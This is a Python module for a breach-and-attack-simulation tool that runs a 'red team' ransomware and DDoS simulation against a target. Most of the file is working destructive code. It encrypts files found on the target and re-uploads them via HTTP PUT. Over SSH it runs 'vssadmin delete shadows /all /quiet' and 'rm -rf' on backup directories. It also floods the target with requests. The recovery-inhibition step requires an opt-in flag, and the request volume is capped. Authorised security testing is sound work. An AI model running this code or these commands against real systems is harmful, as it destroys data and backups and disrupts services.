"""
Impact Simulation – RED TEAM (destructive ransomware + DDoS)
MITRE ATT&CK: T1486, T1490, T1498, T1499

WARNING: This module actually encrypts files, deletes shadow copies, and floods targets.
Only use in isolated test environments. Destructive recovery inhibition is disabled by default
and must be explicitly enabled via option `enable_recovery_inhibition=True`.

Changes from original:
- Issue #29: The Fernet decryption key is now stored and reported in the finding,
  allowing file recovery after the simulation.
- Issue #30: Shadow copy deletion and backup folder removal now require an explicit
  option flag (`enable_recovery_inhibition`). Without it, the stage is skipped and a
  warning finding is generated.
"""

import asyncio
import aiohttp
import os
import time
import uuid
import shutil
import logging
import platform
from typing import List
from cryptography.fernet import Fernet

from bas_engine.attack_modules.utils.endpoint_validator import is_real_endpoint
from bas_engine.attack_modules.base import BaseAttackModule
from bas_engine.models.simulation import Finding, Severity

logger = logging.getLogger("secureforge.module.impact.red")


class ImpactSimModule(BaseAttackModule):
    MODULE_NAME  = "impact_sim"
    DESCRIPTION  = "Destructive ransomware (encryption, backup deletion) and DDoS"
    MITRE_TACTIC = "Impact"
    MITRE_IDS    = ["T1486", "T1083", "T1490", "T1071", "T1498", "T1499"]

    FILE_DISCOVERY_PATHS = [
        "/uploads", "/files", "/documents", "/backup", "/data",
        "/export", "/images", "/assets", "/media", "/storage"
    ]
    # /api/register is deliberately excluded — it is a standard REST endpoint
    # that generates guaranteed false positives on any web application.
    C2_PATHS = ["/c2/beacon", "/update/check", "/ping"]

    async def execute(self) -> List[Finding]:
        findings = []
        resolved = await self.resolve_target()
        target = self.build_target_url(resolved, default_scheme="https")

        findings.extend(await self._stage_ransomware(target))
        findings.extend(await self._stage_ddos(target))

        return findings

    # ─── Ransomware Stage ─────────────────────────────────────────

    async def _stage_ransomware(self, target: str) -> List[Finding]:
        findings = []
        discovered = await self._discover_paths(target)
        if not discovered:
            findings.append(self.finding(
                title="No accessible storage paths found",
                description="Encryption skipped.",
                severity=Severity.INFO,
                mitre_id="T1083",
                evidence="No paths discovered",
                remediation="Verify target accessibility and ensure file discovery paths exist.",
                mode="red",
                evidence_type="ransomware"
            ))
            return findings

        # Inhibit recovery – now gated by explicit option
        findings.extend(await self._inhibit_recovery())

        # Encrypt files – key is returned with the finding
        findings.extend(await self._encrypt_files(target, discovered))

        return findings

    async def _discover_paths(self, target: str) -> List[str]:
        discovered = []
        async with aiohttp.ClientSession(
            timeout=aiohttp.ClientTimeout(total=10),
            headers={"User-Agent": "SecureForge-RED/1.0"}
        ) as session:
            for path in self.FILE_DISCOVERY_PATHS:
                url = target.rstrip("/") + path
                try:
                    async with session.get(url, allow_redirects=False) as resp:
                        if resp.status in (200, 403):
                            real = await is_real_endpoint(session, target, path)
                            if real:
                                discovered.append(path)
                except Exception:
                    pass
                await asyncio.sleep(0.2)
        return discovered

    async def _run_cmd(self, cmd: str) -> str:
        ssh_user = self.options.get("ssh_user")
        ssh_pass = self.options.get("ssh_pass")
        ssh_key = self.options.get("ssh_key")
        ssh_port = int(self.options.get("ssh_port", 22))

        if not ssh_user:
            logger.error("Target execution requires 'ssh_user' in options.")
            return ""

        import asyncssh
        from urllib.parse import urlparse
        
        parsed = urlparse(self.target)
        host = parsed.hostname or parsed.path

        async with asyncssh.connect(
            host,
            port=ssh_port,
            username=ssh_user,
            password=ssh_pass,
            client_keys=[ssh_key] if ssh_key else None,
            known_hosts=()
        ) as conn:
            result = await conn.run(cmd, check=False)
            return result.stdout or ""

    async def _inhibit_recovery(self) -> List[Finding]:
        findings = []

        # Safety gate – must be explicitly enabled
        enable_inhibition = self.options.get("enable_recovery_inhibition", False)
        if not enable_inhibition:
            findings.append(self.finding(
                title="Recovery Inhibition Disabled",
                description=(
                    "Destructive recovery inhibition (shadow copy deletion, backup removal) "
                    "was **not** executed because the option 'enable_recovery_inhibition' is "
                    "not set to True. To actually delete backups for a full destructive test, "
                    "set enable_recovery_inhibition=True in the module options."
                ),
                severity=Severity.INFO,
                mitre_id="T1490",
                evidence="Option enable_recovery_inhibition=False (default). No commands run.",
                remediation="Ensure recovery inhibition is deliberately enabled or disabled based on simulation goals.",
                mode="red",
                evidence_type="ransomware"
            ))
            return findings

        # SSH credentials are still required to run remote commands
        if not self.options.get("ssh_user"):
            findings.append(self.finding(
                title="Target Execution Blocked (Recovery Inhibition)",
                description="Recovery inhibition requires SSH credentials (ssh_user, ssh_pass/ssh_key).",
                severity=Severity.INFO,
                mitre_id="N/A",
                evidence="No SSH credentials provided. Skipping recovery deletion.",
                remediation="Configure the module with ssh_user and ssh_pass/ssh_key if target execution is needed.",
                mode="red",
                evidence_type="ransomware"
            ))
            return findings

        try:
            uname = await self._run_cmd("uname -a")
            system = "Linux" if "Linux" in uname else "Windows"
            
            if system == "Windows":
                cmd = "vssadmin delete shadows /all /quiet"
                stdout = await self._run_cmd(f"powershell -NoProfile -Command \"{cmd}\"")
                findings.append(self.finding(
                    title="Shadow Copies Deleted",
                    description="Executed vssadmin to delete all system restore points. (Destructive)",
                    severity=Severity.CRITICAL,
                    mitre_id="T1490",
                    evidence=f"Command: {cmd}\nOutput: {stdout}",
                    remediation="Regularly test offline backups; ensure Volume Shadow Copy is not the only backup.",
                    mode="red",
                    evidence_type="ransomware"
                ))
            elif system == "Linux":
                backup_dirs = ["/backup", "/var/backup", "/srv/backup"]
                for d in backup_dirs:
                    stdout = await self._run_cmd(f"rm -rf {d}")
                    findings.append(self.finding(
                        title=f"Deleted backup directory: {d}",
                        description="Removed local backups. (Destructive)",
                        severity=Severity.CRITICAL,
                        mitre_id="T1490",
                        evidence=f"rm -rf {d} -> {stdout}",
                        remediation="Implement off‑site immutable backups.",
                        mode="red",
                        evidence_type="ransomware"
                    ))
        except Exception as e:
            logger.error(f"Inhibit recovery error: {e}")
            findings.append(self.finding(
                title="Recovery Inhibition Failed",
                description=f"An error occurred while attempting to inhibit recovery: {e}",
                severity=Severity.HIGH,
                mitre_id="T1490",
                evidence=str(e),
                remediation="Check SSH connectivity and permissions.",
                mode="red",
                evidence_type="ransomware"
            ))
        return findings

    async def _encrypt_files(self, target: str, discovered_paths: List[str]) -> List[Finding]:
        findings = []
        key = Fernet.generate_key()
        cipher = Fernet(key)
        encrypted_count = 0

        async with aiohttp.ClientSession(
            timeout=aiohttp.ClientTimeout(total=15),
            headers={"User-Agent": "SecureForge-RED/1.0"}
        ) as session:
            for path in discovered_paths:
                base_url = target.rstrip("/") + path
                test_files = ["index.html", "readme.txt", "backup.zip", "data.db"]
                for fname in test_files:
                    url = f"{base_url}/{fname}"
                    try:
                        async with session.get(url) as resp:
                            if resp.status == 200:
                                content = await resp.read()
                                encrypted_content = cipher.encrypt(content)
                                encrypt_url = url + ".locked"
                                async with session.put(encrypt_url, data=encrypted_content) as put_resp:
                                    if put_resp.status in (200, 201, 204):
                                        encrypted_count += 1
                    except Exception:
                        pass
                    await asyncio.sleep(0.1)

        if encrypted_count > 0:
            # Store the decryption key in the finding for recovery
            key_str = key.decode()
            findings.append(self.finding(
                title="Files Encrypted (Ransomware Simulation)",
                description=(
                    f"Encrypted {encrypted_count} file(s) via HTTP PUT with Fernet symmetric encryption. "
                    f"The decryption key is included in this finding for recovery purposes: "
                    f"{key_str}  (Keep this key secure; after the simulation, use it to decrypt files with "
                    f"Fernet(key).decrypt())."
                ),
                severity=Severity.CRITICAL,
                mitre_id="T1486",
                evidence=f"Target: {target}\nEncrypted files: {encrypted_count}\nKey: {key_str}",
                remediation=(
                    "Restore from offline backups OR use the provided Fernet key to decrypt files. "
                    "Audit HTTP PUT access on all storage paths."
                ),
                mode="red",
                evidence_type="ransomware",
                raw_data={"decryption_key": key_str, "encrypted_count": encrypted_count}
            ))
        else:
            findings.append(self.finding(
                title="Encryption Attempted but No Files Encrypted",
                description="Could not download and re-upload any files via HTTP PUT.",
                severity=Severity.MEDIUM,
                mitre_id="T1486",
                evidence="No files modified.",
                remediation="Check file permissions and PUT support on the target.",
                mode="red",
                evidence_type="ransomware"
            ))
        return findings

    # ─── DDoS Stage ───────────────────────────────────────────────

    async def _stage_ddos(self, target: str) -> List[Finding]:
        findings = []
        req_count = min(int(self.options.get("ddos_requests", 500)), 1000)      # hard cap: 1000
        concurrency = min(int(self.options.get("ddos_concurrency", 20)), 50)    # hard cap: 50
        duration = min(int(self.options.get("ddos_duration", 15)), 30)          # hard cap: 30s

        ssl_verify = self.options.get("ssl_verify", False)
        if not ssl_verify:
            self.logger.warning("⚠️ SSL Verification is disabled for Impact Sim (Red)")
        connector = aiohttp.TCPConnector(ssl=ssl_verify, limit=concurrency, force_close=True)
        timeout = aiohttp.ClientTimeout(total=5)

        start_time = time.time()
        sent = 0
        errors = 0

        async with aiohttp.ClientSession(
            connector=connector,
            timeout=timeout,
            headers={"User-Agent": "Mozilla/5.0"}
        ) as session:
            async def flood():
                nonlocal sent, errors
                while time.time() - start_time < duration and sent < req_count:
                    url = f"{target}?_={uuid.uuid4().hex}"
                    try:
                        async with session.get(url) as resp:
                            pass
                    except Exception as e:
                        logger.error(f"Impact sim red error: {e}")
                        errors += 1
                    sent += 1

            tasks = [asyncio.create_task(flood()) for _ in range(concurrency)]
            await asyncio.gather(*tasks, return_exceptions=True)

        elapsed = time.time() - start_time
        findings.append(self.finding(
            title="Volumetric DDoS Attack Executed",
            description=f"Sent {sent} requests in {elapsed:.1f}s ({sent/elapsed:.1f} req/s). Errors: {errors}.",
            severity=Severity.CRITICAL,
            mitre_id="T1498",
            evidence=f"Target: {target}\nDuration: {duration}s",
            remediation="Implement rate limiting and DDoS protection.",
            mode="red",
            evidence_type="ddos"
        ))

        return findings